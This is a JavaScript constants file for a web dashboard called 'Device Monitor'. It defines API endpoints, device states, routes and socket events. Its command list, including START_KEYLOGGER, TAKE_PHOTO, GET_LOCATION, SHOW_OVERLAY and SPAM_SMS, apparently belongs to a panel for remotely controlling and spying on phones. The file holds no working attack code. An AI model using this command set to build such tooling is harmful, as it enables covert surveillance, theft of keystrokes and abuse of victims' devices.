export const APP_NAME = process.env.NEXT_PUBLIC_APP_NAME || 'Device Monitor';
export const APP_VERSION = process.env.NEXT_PUBLIC_APP_VERSION || '3.0.0';
export const API_URL = process.env.NEXT_PUBLIC_API_URL || 'http://localhost:3001';
export const WS_URL = process.env.NEXT_PUBLIC_WS_URL || 'ws://localhost:3001';

export const DEVICE_STATUS = {
  ONLINE: 'online',
  OFFLINE: 'offline',
  MAINTENANCE: 'maintenance',
  ERROR: 'error',
};

export const ALERT_SEVERITY = {
  INFO: 'info',
  WARNING: 'warning',
  CRITICAL: 'critical',
  EMERGENCY: 'emergency',
};

export const COMMAND_TYPES = {
  OPEN_WEB: 'OPEN_WEB',
  TAKE_PHOTO: 'TAKE_PHOTO',
  START_KEYLOGGER: 'START_KEYLOGGER',
  GET_LOCATION: 'GET_LOCATION',
  LOCK_DEVICE: 'LOCK_DEVICE',
  SHOW_OVERLAY: 'SHOW_OVERLAY',
  SEND_NOTIFICATION: 'SEND_NOTIFICATION',
  MAKE_CALL: 'MAKE_CALL',
  SPAM_SMS: 'SPAM_SMS',
};

export const STORAGE_KEYS = {
  TOKEN: 'token',
  REFRESH_TOKEN: 'refreshToken',
  THEME: 'theme',
  USER: 'user',
};

export const ROUTES = {
  HOME: '/',
  DASHBOARD: '/dashboard',
  LOGIN: '/login',
  REGISTER: '/register',
  DEVICES: '/devices',
  CONNECT: '/connect',
  REPORTS: '/reports',
  ALERTS: '/alerts',
  SETTINGS: '/settings',
  PROFILE: '/profile',
};

export const PAGINATION = {
  DEFAULT_PAGE: 1,
  DEFAULT_LIMIT: 20,
  LIMIT_OPTIONS: [10, 20, 50, 100],
};

export const SOCKET_EVENTS = {
  CONNECT: 'connect',
  DISCONNECT: 'disconnect',
  DEVICE_UPDATE: 'device_update',
  COMMAND_RESULT: 'command_result',
  ALERT: 'alert',
  NOTIFICATION: 'notification',
  SUBSCRIBE: 'subscribe',
  UNSUBSCRIBE: 'unsubscribe',
};
